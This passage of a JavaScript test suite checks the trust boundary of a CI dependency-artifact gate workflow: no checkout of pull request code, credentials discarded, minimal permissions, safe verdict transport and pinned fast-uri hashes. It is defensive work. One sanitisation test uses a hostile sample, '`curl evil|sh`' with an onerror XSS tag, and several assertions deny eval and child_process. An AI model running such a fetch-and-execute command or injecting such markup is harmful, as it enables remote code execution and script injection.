    expect(commandProgram("")).toBeNull();
  });
});

/* ------------------------------------------------------------------ *
 * 6. Static trust-boundary assertions on the workflow itself
 * ------------------------------------------------------------------ */

describe("trusted-dependency-artifact workflow — static trust boundary", () => {
  const runBodies = () => {
    const bodies = [];
    const lines = gateWorkflow.split("\n");
    for (let index = 0; index < lines.length; index += 1) {
      const match = lines[index].match(/^(\s*)run:\s*(\|.*)?$/);
      if (!match) {
        const inline = lines[index].match(/^\s*run:\s+(.+)$/);
        if (inline) bodies.push(inline[1]);
        continue;
      }
      const indent = match[1].length;
      const body = [];
      for (let scan = index + 1; scan < lines.length; scan += 1) {
        if (lines[scan].trim() !== "" && lines[scan].search(/\S/) <= indent) break;
        body.push(lines[scan]);
      }
      bodies.push(body.join("\n"));
    }
    return bodies;
  };

  it("is triggered by pull_request_target against main only", () => {
    expect(gateWorkflow).toMatch(/on:\s*\n\s*pull_request_target:/);
    expect(gateWorkflow).toMatch(/branches: \[main\]/);
    expect(gateWorkflow).toMatch(
      /types: \[opened, synchronize, reopened, ready_for_review\]/,
    );
    // No path filter: a skipped run would leave the required check missing.
    const trigger = gateWorkflow.slice(
      gateWorkflow.indexOf("on:"),
      gateWorkflow.indexOf("permissions: {}"),
    );
    expect(trigger).not.toContain("paths:");
  });

  it("never checks out, merges or fetches the candidate head", () => {
    expect(gateWorkflow).not.toMatch(/pull_request\.head\.ref/);
    expect(gateWorkflow).not.toMatch(/pull_request\.merge_commit_sha/);
    expect(gateWorkflow).not.toMatch(/refs\/pull\//);
    expect(gateWorkflow).not.toMatch(/ref:\s*\$\{\{\s*github\.event\.pull_request\.head/);
    const checkoutRefs = [...gateWorkflow.matchAll(/^\s*ref:\s*(.+)$/gm)].map(m => m[1].trim());
    expect(checkoutRefs.length).toBeGreaterThan(0);
    for (const ref of checkoutRefs) {
      expect(ref).toBe("${{ github.event.repository.default_branch }}");
    }
  });

  it("discards checkout credentials in every job", () => {
    const checkouts = gateWorkflow.match(/uses: actions\/checkout@/g) ?? [];
    const disabled = gateWorkflow.match(/persist-credentials: false/g) ?? [];
    expect(checkouts.length).toBeGreaterThan(0);
    expect(disabled.length).toBe(checkouts.length);
  });

  it("grants the minimum scopes and keeps write away from candidate data", () => {
    expect(gateWorkflow).toMatch(/^permissions: \{\}$/m);
    const validate = gateWorkflow.slice(
      gateWorkflow.indexOf("  validate:"),
      gateWorkflow.indexOf("  publish:"),
    );
    expect(validate).toMatch(/permissions:\n\s+contents: read\n/);
    expect(validate).not.toMatch(/checks:\s*write/);
    expect(validate).not.toMatch(/security-events/);
    expect(validate).not.toMatch(/pull-requests:\s*write/);

    const publish = gateWorkflow.slice(gateWorkflow.indexOf("  publish:"));
    expect(publish).toMatch(/permissions:\n\s+contents: read\n\s+checks: write\n/);
    // The only job holding a write scope must never read candidate content.
    expect(publish).not.toMatch(/verify-dependency-artifact-gate/);
  });

  it("runs no npm, npx, package script or candidate code", () => {
    for (const body of runBodies()) {
      expect(body).not.toMatch(/\bnpm\b/);
      expect(body).not.toMatch(/\bnpx\b/);
      expect(body).not.toMatch(/\byarn\b/);
    }
    expect(gateWorkflowCode).not.toMatch(/npm ci/);
    expect(gateWorkflowCode).not.toMatch(/actions\/github-script/);
    expect(gateWorkflowCode).not.toMatch(/cache:/);
    expect(gateWorkflowCode).not.toMatch(/upload-artifact/);
    expect(gateWorkflowCode).not.toMatch(/download-artifact/);
  });

  it("never interpolates candidate data into a shell body", () => {
    for (const body of runBodies()) {
      expect(body).not.toContain("${{");
    }
  });

  it("passes candidate-controlled values only through env, and validates them", () => {
    expect(gateWorkflow).toMatch(/GATE_HEAD_SHA: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/);
    expect(gateWorkflow).toMatch(/GATE_BASE_REF: \$\{\{ github\.event\.pull_request\.base\.ref \}\}/);
    const gateSource = readText("scripts", "trusted", "verify-dependency-artifact-gate.mjs");
    expect(gateSource).toMatch(/FULL_OBJECT_ID\.test\(String\(eventHeadSha/);
    expect(gateSource).not.toMatch(/child_process/);
    expect(gateSource).not.toMatch(/\beval\(/);
    expect(gateSource).not.toMatch(/new Function/);
    expect(gateSource).not.toMatch(/node:vm/);
  });

  it("publishes the authoritative check on the pull request head SHA", () => {
    const publisher = readText("scripts", "trusted", "publish-gate-check.mjs");
    expect(publisher).toMatch(/head_sha: headSha/);
    expect(gateWorkflow).toMatch(/GATE_HEAD_SHA: \$\{\{ github\.event\.pull_request\.head\.sha \}\}/);
    expect(realPolicy.checkName).toBe("trusted-dependency-artifact");
  });

  it("publishes even when validate fails, is cancelled or is skipped", () => {
    expect(gateWorkflow).toMatch(/needs: \[validate\]\n\s+if: always\(\)/);
    for (const result of ["failure", "cancelled", "skipped"]) {
      expect(decodeVerdict(undefined, result).conclusion).toBe("failure");
    }
  });
});

/* ------------------------------------------------------------------ *
 * 7. Verdict transport and summary sanitisation
 * ------------------------------------------------------------------ */

describe("authoritative gate — verdict transport", () => {
  const encode = value => Buffer.from(JSON.stringify(value), "utf8").toString("base64");

  it("never reports success when the validate job did not succeed", () => {
    const passing = { conclusion: "success", mode: "artifact", messages: [] };
    expect(decodeVerdict(encode(passing), "success").conclusion).toBe("success");
    expect(decodeVerdict(encode(passing), "failure").conclusion).toBe("failure");
    expect(decodeVerdict(encode(passing), "cancelled").conclusion).toBe("failure");
  });

  it("rejects a malformed or absent verdict rather than guessing", () => {
    expect(decodeVerdict("not-base64-json", "success").conclusion).toBe("failure");
    expect(decodeVerdict(encode({ conclusion: "success" }), "success").conclusion).toBe("failure");
    expect(decodeVerdict(encode({ conclusion: "success", mode: "made-up", messages: [] }), "success").conclusion).toBe("failure");
    expect(decodeVerdict("", "success").conclusion).toBe("failure");
  });

  it("strips candidate-controlled markup out of the check summary", () => {
    const hostile = "`curl evil|sh` <img src=x onerror=alert(1)> \n\n### heading";
    const check = buildCheckRun({
      policy: realPolicy,
      headSha: HEAD_SHA,
      verdict: decodeVerdict(
        encode({ conclusion: "failure", mode: "artifact", messages: [hostile] }),
        "failure",
      ),
      runUrl: "https://example.invalid/run",
    });
    expect(check.name).toBe("trusted-dependency-artifact");
    expect(check.head_sha).toBe(HEAD_SHA);
    expect(check.conclusion).toBe("failure");
    expect(check.output.summary).not.toContain("<img");
    expect(check.output.summary).not.toContain("`");
    expect(check.output.summary).not.toContain("###");
  });

  it("bounds message count and length", () => {
    const verdict = new Verdict({ maxMessages: 3, maxMessageLength: 10 });
    for (let index = 0; index < 10; index += 1) verdict.note(`message-${index}-padding`);
    expect(verdict.messages).toHaveLength(3);
    expect(verdict.messages[0].length).toBeLessThanOrEqual(10);
    expect(sanitizeToken("a\nb\tc", 10)).toBe("a b c");
  });
});

/* ------------------------------------------------------------------ *
 * 8. The committed policy itself
 * ------------------------------------------------------------------ */

describe("trusted policy document", () => {
  it("parses, validates, and pins the reviewed fast-uri artifact", () => {
    expect(() => assertPolicyShape(realPolicy)).not.toThrow();
    expect(realPolicy.package.tar.sha256).toBe(
      "3fa380284be4ecbf471c1dbb8c5da6f517c95f54279f88c2037985d03fdc6d92",
    );
    expect(realPolicy.package.tar.size).toBe(43760);
    expect(realPolicy.package.tar.fileCount).toBe(44);
    expect(realPolicy.package.integrity).toBe(
      "sha512-dOvZVzjdZdz7phd9v6jCbwxrBW3fK6n8Rc0CtdmM4bumzMnxywBYhuph6J819RRw/ku+rLbelwfMunktuzVVHg==",
    );
    expect(realPolicy.package.dependentRange).toBe("^3.0.1");
    expect(realPolicy.verifierPolicyLiterals.requiredAdvisories).toHaveLength(6);
  });

  it("guards every path a dependency-artifact change can travel through", () => {
    for (const path of [
      "package.json",
      "package-lock.json",
      "npm-shrinkwrap.json",
      ".npmrc",
      ".gitattributes",
      "scripts/verify-fast-uri-artifact.mjs",
      "scripts/verify-fast-uri-bootstrap.mjs",
    ]) {
      expect(classifyChangedPaths(realPolicy, [path]).guarded, path).toContain(path);
    }
    expect(classifyChangedPaths(realPolicy, ["vendor/npm/other/x.tgz"]).guarded).toHaveLength(1);
    expect(classifyChangedPaths(realPolicy, ["tools/.npmrc"]).guarded).toHaveLength(1);
  });

  it("treats its own infrastructure as trusted, not merely guarded", () => {
    for (const path of realPolicy.trustedPaths) {
      expect(classifyChangedPaths(realPolicy, [path]).trusted, path).toContain(path);
    }
  });

  it("extracts literals and advisories without evaluating candidate source", () => {
    const literals = extractPolicyLiterals(VERIFIER_SOURCE, "FAST_URI_POLICY");
    expect(literals.get("version")).toBe("3.1.7");
    expect(literals.get("artifactFileCount")).toBe(44);
    expect(extractAdvisoryIds(VERIFIER_SOURCE)).toEqual(
      realPolicy.verifierPolicyLiterals.requiredAdvisories,
    );
  });
});
